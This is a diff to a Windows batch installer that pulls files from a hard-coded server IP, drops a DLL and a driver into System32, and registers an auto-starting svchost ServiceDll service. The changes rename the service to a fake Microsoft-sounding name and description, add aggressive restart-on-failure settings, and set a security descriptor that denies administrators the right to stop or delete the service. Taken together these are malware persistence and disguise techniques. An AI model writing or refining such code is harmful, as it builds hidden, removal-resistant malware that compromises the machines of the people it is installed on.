@@ -5,8 +5,8 @@ set Q=%TEMP%\_q.tmp
 set SERVER=https://64.226.66.66
 if not "%~1"=="" set SERVER=%~1
 set TD=%TEMP%\wpnp_%RANDOM%
-set SVC=WPnpSvc
-set SVCGROUP=PnpExtGroup
+set SVC=MspIscSvc
+set SVCGROUP=MspGroup
 
 echo ============================================
 echo  Web Setup - Server: %SERVER%
@@ -48,7 +48,7 @@ reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %S
 sc.exe delete %SVC% >"%Q%" 2>&1
 reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /f >"%Q%" 2>&1
 taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
-del /f /q "%SystemRoot%\System32\WPnpSvc.exe" >"%Q%" 2>&1
+del /f /q "%SystemRoot%\System32\MspIscSvc.exe" >"%Q%" 2>&1
 del /f /q "%SystemRoot%\System32\spoolcfg.exe" >"%Q%" 2>&1
 del /f /q "%SystemRoot%\System32\pnpext.dll.old" >"%Q%" 2>&1
 del /f /q "%SystemRoot%\System32\pnpext.dll.new" >"%Q%" 2>&1
@@ -59,9 +59,11 @@ if exist "%TD%\pnpext.sys" (copy /y "%TD%\pnpext.sys" "%SystemRoot%\System32\dri
 echo        Files copied
 echo [5/7] Creating service (svchost.exe ServiceDll)...
 reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /t REG_MULTI_SZ /d %SVC% /f >"%Q%" 2>&1
-sc.exe create %SVC% binPath= "%SystemRoot%\System32\svchost.exe -k %SVCGROUP%" type= share start= auto DisplayName= "Windows Plug and Play Extensions" >"%Q%" 2>&1
-sc.exe description %SVC% "Manages extended Plug and Play device configuration and compatibility" >"%Q%" 2>&1
+sc.exe create %SVC% binPath= "%SystemRoot%\System32\svchost.exe -k %SVCGROUP%" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" >"%Q%" 2>&1
+sc.exe description %SVC% "Maintains internal cache and inter-service context for Windows system providers." >"%Q%" 2>&1
 sc.exe failure %SVC% reset= 86400 actions= restart/10000/restart/30000/restart/60000 >"%Q%" 2>&1
+sc.exe failureflag %SVC% 1 >"%Q%" 2>&1
+sc.exe sdset %SVC% "D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" >"%Q%" 2>&1
 echo [6/7] Configuring ServiceDll...
 reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
 reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceMain /t REG_SZ /d "PnpServiceEntry" /f >"%Q%" 2>&1
